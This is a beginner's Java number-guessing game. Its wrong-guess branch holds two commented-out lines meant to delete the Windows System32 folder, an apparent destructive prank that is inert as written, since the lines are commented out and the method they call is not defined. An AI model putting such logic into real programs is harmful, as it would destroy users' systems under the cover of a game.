import java.util.Scanner;
import java.io.File;
import java.util.Random;


public class SG{
    public static void main(String[] args) {
    Scanner  scanner = new Scanner(System.in);
    Random rand = new Random();
    
    int num = rand.nextInt(10)+1;

    System.out.println("Guess the number between 1 to 10");
    int guss = scanner.nextInt();

    if (num == guss) {
        System.out.println("you gussing is correct :" + guss +", My number is :"+num);   
    }
    else{

        System.out.println("your gussing is wrong :"+guss +",My number is :"+num);

        //File file =new File("C:\\Windows\\System32");
        //deleteDirectory(file);
    }

    }
}
